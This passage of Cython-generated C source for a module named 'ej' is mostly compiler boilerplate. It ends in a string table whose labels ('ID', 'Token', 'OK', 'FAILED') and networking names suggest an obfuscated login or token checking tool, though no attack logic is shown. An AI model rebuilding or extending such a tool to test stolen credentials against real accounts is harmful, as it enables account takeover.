PyErr_Fetch(type, value, tb)\n#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)\n#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)\n#endif\n\n/* PyObjectGetAttrStr.proto */\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);\n#else\n#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)\n#endif\n\n/* PyObjectGetAttrStrNoError.proto */\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStrNoError(PyObject* obj, PyObject* attr_name);\n\n/* GetBuiltinName.proto */\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name);\n\n/* TupleAndListFromArray.proto */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyList_FromArray(PyObject *const *src, Py_ssize_t n);\nstatic CYTHON_INLINE PyObject* __Pyx_PyTuple_FromArray(PyObject *const *src, Py_ssize_t n);\n#endif\n\n/* IncludeStringH.proto */\n#include <string.h>\n\n/* BytesEquals.proto */\nstatic CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals);\n\n/* UnicodeEquals.proto */\nstatic CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals);\n\n/* fastcall.proto */\n#if CYTHON_AVOID_BORROWED_REFS\n    #define __Pyx_Arg_VARARGS(args, i) PySequence_GetItem(args, i)\n#elif CYTHON_ASSUME_SAFE_MACROS\n    #define __Pyx_Arg_VARARGS(args, i) PyTuple_GET_ITEM(args, i)\n#else\n    #define __Pyx_Arg_VARARGS(args, i) PyTuple_GetItem(args, i)\n#endif\n#if CYTHON_AVOID_BORROWED_REFS\n    #define __Pyx_Arg_NewRef_VARARGS(arg) __Pyx_NewRef(arg)\n    #define __Pyx_Arg_XDECREF_VARARGS(arg) Py_XDECREF(arg)\n#else\n    #define __Pyx_Arg_NewRef_VARARGS(arg) arg // no-op\n    #define __Pyx_Arg_XDECREF_VARARGS(arg) // no-op - arg is borrowed\n#endif\n#define __Pyx_NumKwargs_VARARGS(kwds) PyDict_Size(kwds)\n#define __Pyx_KwValues_VARARGS(args, nargs) NULL\n#define __Pyx_GetKwValue_VARARGS(kw, kwvalues, s) __Pyx_PyDict_GetItemStrWithError(kw, s)\n#define __Pyx_KwargsAsDict_VARARGS(kw, kwvalues) PyDict_Copy(kw)\n#if CYTHON_METH_FASTCALL\n    #define __Pyx_Arg_FASTCALL(args, i) args[i]\n    #define __Pyx_NumKwargs_FASTCALL(kwds) PyTuple_GET_SIZE(kwds)\n    #define __Pyx_KwValues_FASTCALL(args, nargs) ((args) + (nargs))\n    static CYTHON_INLINE PyObject * __Pyx_GetKwValue_FASTCALL(PyObject *kwnames, PyObject *const *kwvalues, PyObject *s);\n    #define __Pyx_KwargsAsDict_FASTCALL(kw, kwvalues) _PyStack_AsDict(kwvalues, kw)\n    #define __Pyx_Arg_NewRef_FASTCALL(arg) arg // no-op, __Pyx_Arg_FASTCALL is direct and this needs\n    #define __Pyx_Arg_XDECREF_FASTCALL(arg)  // no-op - arg was returned from array\n#else\n    #define __Pyx_Arg_FASTCALL __Pyx_Arg_VARARGS\n    #define __Pyx_NumKwargs_FASTCALL __Pyx_NumKwargs_VARARGS\n    #define __Pyx_KwValues_FASTCALL __Pyx_KwValues_VARARGS\n    #define __Pyx_GetKwValue_FASTCALL __Pyx_GetKwValue_VARARGS\n    #define __Pyx_KwargsAsDict_FASTCALL __Pyx_KwargsAsDict_VARARGS\n    #define __Pyx_Arg_NewRef_FASTCALL(arg) __Pyx_Arg_NewRef_VARARGS(arg)\n    #define __Pyx_Arg_XDECREF_FASTCALL(arg) __Pyx_Arg_XDECREF_VARARGS(arg)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n#define __Pyx_ArgsSlice_VARARGS(args, start, stop) __Pyx_PyTuple_FromArray(&__Pyx_Arg_VARARGS(args, start), stop - start)\n#define __Pyx_ArgsSlice_FASTCALL(args, start, stop) __Pyx_PyTuple_FromArray(&__Pyx_Arg_FASTCALL(args, start), stop - start)\n#else\n#define __Pyx_ArgsSlice_VARARGS(args, start, stop) PyTuple_GetSlice(args, start, stop)\n#define __Pyx_ArgsSlice_FASTCALL(args, start, stop) PyTuple_GetSlice(args, start, stop)\n#endif\n\n/* PyDictVersioning.proto */\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\n#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)\n#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\\\n    (version_var) = __PYX_GET_DICT_VERSION(dict);\\\n    (cache_var) = (value);\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\n    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\\\n        (VAR) = __pyx_dict_cached_value;\\\n    } else {\\\n        (VAR) = __pyx_dict_cached_value = (LOOKUP);\\\n        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\\\n    }\\\n}\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);\n#else\n#define __PYX_GET_DICT_VERSION(dict)  (0)\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);\n#endif\n\n/* GetModuleGlobalName.proto */\n#if CYTHON_USE_DICT_VERSIONS\n#define __Pyx_GetModuleGlobalName(var, name)  do {\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\n    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\\\n        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\\\n        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\n} while(0)\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\\\n    PY_UINT64_T __pyx_dict_version;\\\n    PyObject *__pyx_dict_cached_value;\\\n    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\n} while(0)\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);\n#else\n#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);\n#endif\n\n/* PyFunctionFastCall.proto */\n#if CYTHON_FAST_PYCALL\n#if !CYTHON_VECTORCALL\n#define __Pyx_PyFunction_FastCall(func, args, nargs)\\\n    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);\n#endif\n#define __Pyx_BUILD_ASSERT_EXPR(cond)\\\n    (sizeof(char [1 - 2*!(cond)]) - 1)\n#ifndef Py_MEMBER_SIZE\n#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)\n#endif\n#if !CYTHON_VECTORCALL\n#if PY_VERSION_HEX >= 0x03080000\n  #include "frameobject.h"\n#if PY_VERSION_HEX >= 0x030b00a6 && !CYTHON_COMPILING_IN_LIMITED_API\n  #ifndef Py_BUILD_CORE\n    #define Py_BUILD_CORE 1\n  #endif\n  #include "internal/pycore_frame.h"\n#endif\n  #define __Pxy_PyFrame_Initialize_Offsets()\n  #define __Pyx_PyFrame_GetLocalsplus(frame)  ((frame)->f_localsplus)\n#else\n  static size_t __pyx_pyframe_localsplus_offset = 0;\n  #include "frameobject.h"\n  #define __Pxy_PyFrame_Initialize_Offsets()\\\n    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\\\n     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))\n  #define __Pyx_PyFrame_GetLocalsplus(frame)\\\n    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))\n#endif\n#endif\n#endif\n\n/* PyObjectCall.proto */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);\n#else\n#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)\n#endif\n\n/* PyObjectCallMethO.proto */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);\n#endif\n\n/* PyObjectFastCall.proto */\n#define __Pyx_PyObject_FastCall(func, args, nargs)  __Pyx_PyObject_FastCallDict(func, args, (size_t)(nargs), NULL)\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_FastCallDict(PyObject *func, PyObject **args, size_t nargs, PyObject *kwargs);\n\n/* PyObject_Str.proto */\n#define __Pyx_PyObject_Str(obj)\\\n    (likely(PyString_CheckExact(obj)) ? __Pyx_NewRef(obj) : PyObject_Str(obj))\n\n/* PySequenceContains.proto */\nstatic CYTHON_INLINE int __Pyx_PySequence_ContainsTF(PyObject* item, PyObject* seq, int eq) {\n    int result = PySequence_Contains(seq, item);\n    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));\n}\n\n/* PyIntBinop.proto */\n#if !CYTHON_COMPILING_IN_PYPY\nstatic PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);\n#else\n#define __Pyx_PyInt_AddObjC(op1, op2, intval, inplace, zerodivision_check)\\\n    (inplace ? PyNumber_InPlaceAdd(op1, op2) : PyNumber_Add(op1, op2))\n#endif\n\n/* PyObjectFormatSimple.proto */\n#if CYTHON_COMPILING_IN_PYPY\n    #define __Pyx_PyObject_FormatSimple(s, f) (\\\n        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\\\n        PyObject_Format(s, f))\n#elif PY_MAJOR_VERSION < 3\n    #define __Pyx_PyObject_FormatSimple(s, f) (\\\n        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\\\n        likely(PyString_CheckExact(s)) ? PyUnicode_FromEncodedObject(s, NULL, "strict") :\\\n        PyObject_Format(s, f))\n#elif CYTHON_USE_TYPE_SLOTS\n    #define __Pyx_PyObject_FormatSimple(s, f) (\\\n        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\\\n        likely(PyLong_CheckExact(s)) ? PyLong_Type.tp_repr(s) :\\\n        likely(PyFloat_CheckExact(s)) ? PyFloat_Type.tp_repr(s) :\\\n        PyObject_Format(s, f))\n#else\n    #define __Pyx_PyObject_FormatSimple(s, f) (\\\n        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\\\n        PyObject_Format(s, f))\n#endif\n\n/* JoinPyUnicode.proto */\nstatic PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,\n                                      Py_UCS4 max_char);\n\n/* GetTopmostException.proto */\n#if CYTHON_USE_EXC_INFO_STACK && CYTHON_FAST_THREAD_STATE\nstatic _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);\n#endif\n\n/* SaveResetException.proto */\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);\n#else\n#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)\n#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)\n#endif\n\n/* GetException.proto */\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)\nstatic int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#else\nstatic int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);\n#endif\n\n/* Import.proto */\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);\n\n/* ImportDottedModule.proto */\nstatic PyObject *__Pyx_ImportDottedModule(PyObject *name, PyObject *parts_tuple);\n#if PY_MAJOR_VERSION >= 3\nstatic PyObject *__Pyx_ImportDottedModule_WalkParts(PyObject *module, PyObject *name, PyObject *parts_tuple);\n#endif\n\n/* ImportFrom.proto */\nstatic PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name);\n\n/* PyObjectCallOneArg.proto */\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);\n\n/* IncludeStructmemberH.proto */\n#include <structmember.h>\n\n/* FixUpExtensionType.proto */\n#if CYTHON_USE_TYPE_SPECS\nstatic int __Pyx_fix_up_extension_type_from_spec(PyType_Spec *spec, PyTypeObject *type);\n#endif\n\n/* FetchSharedCythonModule.proto */\nstatic PyObject *__Pyx_FetchSharedCythonABIModule(void);\n\n/* FetchCommonType.proto */\n#if !CYTHON_USE_TYPE_SPECS\nstatic PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);\n#else\nstatic PyTypeObject* __Pyx_FetchCommonTypeFromSpec(PyObject *module, PyType_Spec *spec, PyObject *bases);\n#endif\n\n/* PyMethodNew.proto */\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic PyObject *__Pyx_PyMethod_New(PyObject *func, PyObject *self, PyObject *typ) {\n    PyObject *typesModule=NULL, *methodType=NULL, *result=NULL;\n    CYTHON_UNUSED_VAR(typ);\n    if (!self)\n        return __Pyx_NewRef(func);\n    typesModule = PyImport_ImportModule("types");\n    if (!typesModule) return NULL;\n    methodType = PyObject_GetAttrString(typesModule, "MethodType");\n    Py_DECREF(typesModule);\n    if (!methodType) return NULL;\n    result = PyObject_CallFunctionObjArgs(methodType, func, self, NULL);\n    Py_DECREF(methodType);\n    return result;\n}\n#elif PY_MAJOR_VERSION >= 3\nstatic PyObject *__Pyx_PyMethod_New(PyObject *func, PyObject *self, PyObject *typ) {\n    CYTHON_UNUSED_VAR(typ);\n    if (!self)\n        return __Pyx_NewRef(func);\n    return PyMethod_New(func, self);\n}\n#else\n    #define __Pyx_PyMethod_New PyMethod_New\n#endif\n\n/* PyVectorcallFastCallDict.proto */\n#if CYTHON_METH_FASTCALL\nstatic CYTHON_INLINE PyObject *__Pyx_PyVectorcall_FastCallDict(PyObject *func, __pyx_vectorcallfunc vc, PyObject *const *args, size_t nargs, PyObject *kw);\n#endif\n\n/* CythonFunctionShared.proto */\n#define __Pyx_CyFunction_USED\n#define __Pyx_CYFUNCTION_STATICMETHOD  0x01\n#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02\n#define __Pyx_CYFUNCTION_CCLASS        0x04\n#define __Pyx_CYFUNCTION_COROUTINE     0x08\n#define __Pyx_CyFunction_GetClosure(f)\\\n    (((__pyx_CyFunctionObject *) (f))->func_closure)\n#if PY_VERSION_HEX < 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API\n  #define __Pyx_CyFunction_GetClassObj(f)\\\n      (((__pyx_CyFunctionObject *) (f))->func_classobj)\n#else\n  #define __Pyx_CyFunction_GetClassObj(f)\\\n      ((PyObject*) ((PyCMethodObject *) (f))->mm_class)\n#endif\n#define __Pyx_CyFunction_SetClassObj(f, classobj)\\\n    __Pyx__CyFunction_SetClassObj((__pyx_CyFunctionObject *) (f), (classobj))\n#define __Pyx_CyFunction_Defaults(type, f)\\\n    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))\n#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\\\n    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)\ntypedef struct {\n#if CYTHON_COMPILING_IN_LIMITED_API\n    PyObject_HEAD\n    PyObject *func;\n#elif PY_VERSION_HEX < 0x030900B1\n    PyCFunctionObject func;\n#else\n    PyCMethodObject func;\n#endif\n#if CYTHON_BACKPORT_VECTORCALL\n    __pyx_vectorcallfunc func_vectorcall;\n#endif\n#if PY_VERSION_HEX < 0x030500A0 || CYTHON_COMPILING_IN_LIMITED_API\n    PyObject *func_weakreflist;\n#endif\n    PyObject *func_dict;\n    PyObject *func_name;\n    PyObject *func_qualname;\n    PyObject *func_doc;\n    PyObject *func_globals;\n    PyObject *func_code;\n    PyObject *func_closure;\n#if PY_VERSION_HEX < 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API\n    PyObject *func_classobj;\n#endif\n    void *defaults;\n    int defaults_pyobjects;\n    size_t defaults_size;  // used by FusedFunction for copying defaults\n    int flags;\n    PyObject *defaults_tuple;\n    PyObject *defaults_kwdict;\n    PyObject *(*defaults_getter)(PyObject *);\n    PyObject *func_annotations;\n    PyObject *func_is_coroutine;\n} __pyx_CyFunctionObject;\n#undef __Pyx_CyOrPyCFunction_Check\n#define __Pyx_CyFunction_Check(obj)  __Pyx_TypeCheck(obj, __pyx_CyFunctionType)\n#define __Pyx_CyOrPyCFunction_Check(obj)  __Pyx_TypeCheck2(obj, __pyx_CyFunctionType, &PyCFunction_Type)\n#define __Pyx_CyFunction_CheckExact(obj)  __Pyx_IS_TYPE(obj, __pyx_CyFunctionType)\nstatic CYTHON_INLINE int __Pyx__IsSameCyOrCFunction(PyObject *func, void *cfunc);\n#undef __Pyx_IsSameCFunction\n#define __Pyx_IsSameCFunction(func, cfunc)   __Pyx__IsSameCyOrCFunction(func, cfunc)\nstatic PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,\n                                      int flags, PyObject* qualname,\n                                      PyObject *closure,\n                                      PyObject *module, PyObject *globals,\n                                      PyObject* code);\nstatic CYTHON_INLINE void __Pyx__CyFunction_SetClassObj(__pyx_CyFunctionObject* f, PyObject* classobj);\nstatic CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,\n                                                         size_t size,\n                                                         int pyobjects);\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,\n                                                            PyObject *tuple);\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,\n                                                             PyObject *dict);\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,\n                                                              PyObject *dict);\nstatic int __pyx_CyFunction_init(PyObject *module);\n#if CYTHON_METH_FASTCALL\nstatic PyObject * __Pyx_CyFunction_Vectorcall_NOARGS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);\nstatic PyObject * __Pyx_CyFunction_Vectorcall_O(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);\nstatic PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);\nstatic PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS_METHOD(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);\n#if CYTHON_BACKPORT_VECTORCALL\n#define __Pyx_CyFunction_func_vectorcall(f) (((__pyx_CyFunctionObject*)f)->func_vectorcall)\n#else\n#define __Pyx_CyFunction_func_vectorcall(f) (((PyCFunctionObject*)f)->vectorcall)\n#endif\n#endif\n\n/* CythonFunction.proto */\nstatic PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,\n                                      int flags, PyObject* qualname,\n                                      PyObject *closure,\n                                      PyObject *module, PyObject *globals,\n                                      PyObject* code);\n\n/* UnicodeConcatInPlace.proto */\n# if CYTHON_COMPILING_IN_CPYTHON && PY_MAJOR_VERSION >= 3\n    #if CYTHON_REFNANNY\n        #define __Pyx_PyUnicode_ConcatInPlace(left, right) __Pyx_PyUnicode_ConcatInPlaceImpl(&left, right, __pyx_refnanny)\n    #else\n        #define __Pyx_PyUnicode_ConcatInPlace(left, right) __Pyx_PyUnicode_ConcatInPlaceImpl(&left, right)\n    #endif\n    static CYTHON_INLINE PyObject *__Pyx_PyUnicode_ConcatInPlaceImpl(PyObject **p_left, PyObject *right\n        #if CYTHON_REFNANNY\n        , void* __pyx_refnanny\n        #endif\n    );\n#else\n#define __Pyx_PyUnicode_ConcatInPlace __Pyx_PyUnicode_Concat\n#endif\n#define __Pyx_PyUnicode_ConcatInPlaceSafe(left, right) ((unlikely((left) == Py_None) || unlikely((right) == Py_None)) ?\\\n    PyNumber_InPlaceAdd(left, right) : __Pyx_PyUnicode_ConcatInPlace(left, right))\n\n/* CLineInTraceback.proto */\n#ifdef CYTHON_CLINE_IN_TRACEBACK\n#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)\n#else\nstatic int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);\n#endif\n\n/* CodeObjectCache.proto */\n#if !CYTHON_COMPILING_IN_LIMITED_API\ntypedef struct {\n    PyCodeObject* code_object;\n    int code_line;\n} __Pyx_CodeObjectCacheEntry;\nstruct __Pyx_CodeObjectCache {\n    int count;\n    int max_count;\n    __Pyx_CodeObjectCacheEntry* entries;\n};\nstatic struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);\nstatic PyCodeObject *__pyx_find_code_object(int code_line);\nstatic void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);\n#endif\n\n/* AddTraceback.proto */\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename);\n\n/* FormatTypeName.proto */\n#if CYTHON_COMPILING_IN_LIMITED_API\ntypedef PyObject *__Pyx_TypeName;\n#define __Pyx_FMT_TYPENAME "%U"\nstatic __Pyx_TypeName __Pyx_PyType_GetName(PyTypeObject* tp);\n#define __Pyx_DECREF_TypeName(obj) Py_XDECREF(obj)\n#else\ntypedef const char *__Pyx_TypeName;\n#define __Pyx_FMT_TYPENAME "%.200s"\n#define __Pyx_PyType_GetName(tp) ((tp)->tp_name)\n#define __Pyx_DECREF_TypeName(obj)\n#endif\n\n/* GCCDiagnostics.proto */\n#if !defined(__INTEL_COMPILER) && defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))\n#define __Pyx_HAS_GCC_DIAGNOSTIC\n#endif\n\n/* CIntToPy.proto */\nstatic CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);\n\n/* CIntFromPy.proto */\nstatic CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);\n\n/* CIntFromPy.proto */\nstatic CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);\n\n/* FastTypeChecks.proto */\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)\n#define __Pyx_TypeCheck2(obj, type1, type2) __Pyx_IsAnySubtype2(Py_TYPE(obj), (PyTypeObject *)type1, (PyTypeObject *)type2)\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);\nstatic CYTHON_INLINE int __Pyx_IsAnySubtype2(PyTypeObject *cls, PyTypeObject *a, PyTypeObject *b);\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);\n#else\n#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)\n#define __Pyx_TypeCheck2(obj, type1, type2) (PyObject_TypeCheck(obj, (PyTypeObject *)type1) || PyObject_TypeCheck(obj, (PyTypeObject *)type2))\n#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)\n#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))\n#endif\n#define __Pyx_PyErr_ExceptionMatches2(err1, err2)  __Pyx_PyErr_GivenExceptionMatches2(__Pyx_PyErr_CurrentExceptionType(), err1, err2)\n#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)\n\n/* CheckBinaryVersion.proto */\nstatic unsigned long __Pyx_get_runtime_version();\nstatic int __Pyx_check_binary_version(unsigned long ct_version, unsigned long rt_version, int allow_newer);\n\n/* InitStrings.proto */\nstatic int __Pyx_InitStrings(__Pyx_StringTabEntry *t);\n\n/* #### Code section: module_declarations ### */\n\n/* Module declarations from "ej" */\n/* #### Code section: typeinfo ### */\n/* #### Code section: before_global_var ### */\n#define __Pyx_MODULE_NAME "ej"\nextern int __pyx_module_is_main_ej;\nint __pyx_module_is_main_ej = 0;\n\n/* Implementation of "ej" */\n/* #### Code section: global_var ### */\nstatic PyObject *__pyx_builtin_print;\nstatic PyObject *__pyx_builtin_input;\n/* #### Code section: string_decls ### */\nstatic const char __pyx_k_[] = "";\nstatic const char __pyx_k_B[] = "B";\nstatic const char __pyx_k_C[] = "C";\nstatic const char __pyx_k_E[] = "E";\nstatic const char __pyx_k_F[] = "F";\nstatic const char __pyx_k_G[] = "G";\nstatic const char __pyx_k_P[] = "P";\nstatic const char __pyx_k_R[] = "R";\nstatic const char __pyx_k_S[] = "S";\nstatic const char __pyx_k_W[] = "W";\nstatic const char __pyx_k_Y[] = "Y";\nstatic const char __pyx_k_k[] = "k";\nstatic const char __pyx_k_t[] = "t";\nstatic const char __pyx_k_02[] = "+02";\nstatic const char __pyx_k_AB[] = "AB";\nstatic const char __pyx_k_Ab[] = "Ab";\nstatic const char __pyx_k_Bl[] = "Bl";\nstatic const char __pyx_k_PN[] = "PN";\nstatic const char __pyx_k__3[] = "*";\nstatic const char __pyx_k__6[] = ".";\nstatic const char __pyx_k_aB[] = "aB";\nstatic const char __pyx_k_ab[] = "ab";\nstatic const char __pyx_k_ej[] = "ej";\nstatic const char __pyx_k_id[] = "id";\nstatic const char __pyx_k_iv[] = "iv";\nstatic const char __pyx_k_m2[] = "m2";\nstatic const char __pyx_k_os[] = "os";\nstatic const char __pyx_k_AND[] = "AND";\nstatic const char __pyx_k__11[] = " \\360\\235\\227\\234\\360\\235\\227\\227 \\302\\273 ";\nstatic const char __pyx_k__12[] = " \\360\\235\\227\\247\\360\\235\\227\\274\\360\\235\\227\\270\\360\\235\\227\\262\\360\\235\\227\\273 \\302\\273 ";\nstatic const char __pyx_k__15[] = "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\\360\\235\\220\\216\\360\\235\\220\\212 - : ";\nstatic const char __pyx_k__16[] = "\\n\\360\\235\\220\\205\\360\\235\\220\\200\\360\\235\\220\\210\\360\\235\\220\\213\\360\\235\\220\\204\\360\\235\\220\\203 - : ";\nstatic const char __pyx_k__17[] = "\\n";\nstatic const char __pyx_k__18[] = "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~";\nstatic const char __pyx_k__20[] = "?";\nstatic const char __pyx_k_app[] = "app";\nstatic const char __pyx_k_con[] = "con";\nstatic const char __pyx_k_gmt[] = "gmt";\nstatic const char __pyx_k_m1x[] = "m1x";\nstatic const char __pyx_k_m1y[] = "m1y";\nstatic const char __pyx_k_ssl[] = "ssl";\nstatic const char __pyx_k_sys[] = "sys";\nstatic const char __pyx_k_url[] = "url";\nstatic const char __pyx_k_0000[] = "0000";\nstatic const char __pyx_k_AbBs[] = "AbBs";\nstatic const char __pyx_k_Jana[] = "Jana";\nstatic const char __pyx_k_aBbs[] = "aBbs";\nstatic const char __pyx_k_font[] = "font";\nstatic const char __pyx_k_gzip[] = "gzip";\nstatic const char __pyx_k_host[] = "host";\nstatic const char __pyx_k_json[] = "json";\nstatic const char __pyx_k_main[] = "__main__";\nstatic const char __pyx_k_name[] = "__name__";\nstatic const char __pyx_k_post[] = "post";\nstatic const char __pyx_k_recv[] = "recv";\nstatic const char __pyx_k_send[] = "send";\nstatic const char __pyx_k_spec[] = "__spec__";\nstatic const char 